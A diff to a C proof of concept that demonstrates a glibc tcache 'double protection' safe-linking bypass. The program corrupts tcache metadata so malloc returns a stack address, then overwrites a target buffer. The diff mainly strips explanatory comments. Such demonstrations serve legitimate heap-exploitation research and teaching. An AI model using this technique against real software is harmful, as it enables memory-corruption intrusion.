@@ -34,43 +34,30 @@ When an entry is linked into the tcache, its address is XORed with the address i
 #include <assert.h>
 
 int main(void) {
-	// ... setup ...
 	char goal[] = "Replace me!";
 
-	// Step 1: Allocate chunks in different t-caches (0x40 and 0x20)
 	void *a = malloc(0x38);
 	void *b = malloc(0x38);
 	void *c = malloc(0x18);
 	void *d = malloc(0x18);
 
-	// Step 2: Store the target pointer (plaintext) in a heap chunk
 	void *value = malloc(0x28);
 	*(long *)value = ((long)(goal) & ~(0xf));
 
-	// Step 3: Populate t-caches
-	free(a); free(b); // 0x40 t-cache: [b -> a]
-	free(c); free(d); // 0x20 t-cache: [d -> c]
+	free(a); free(b); 
+	free(c); free(d); 
 
-	// Step 4: Vulnerability - Metadata Control
-	// We point the 0x40 t-cache to our 'value' chunk.
-	// This chunk now contains a 'protected' pointer.
 	void *metadata = (void *)((long)(value) & ~(0xfff));
 	*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));
 
-	// Allocate once to make our chunk the head
 	malloc(0x38);
 
-	/* VULNERABILITY: Double Protection */
-	// Point the 0x20 bin to the 0x40 bin metadata.
-	// This tricks the allocator into treating the 0x40 metadata as a chunk.
-	// When linked/allocated, it gets XORed again, reverting to plaintext.
+	// VULNERABILITY: Double Protection
 	*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;
 
-	// Step 5: Allocate twice from 0x20 bin to gain the plaintext pointer
 	malloc(0x18);
 	char *vuln = malloc(0x18);
 
-	// Step 6: Overwrite
 	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");
 	assert(strcmp(goal, "Replace me!") != 0);
 }
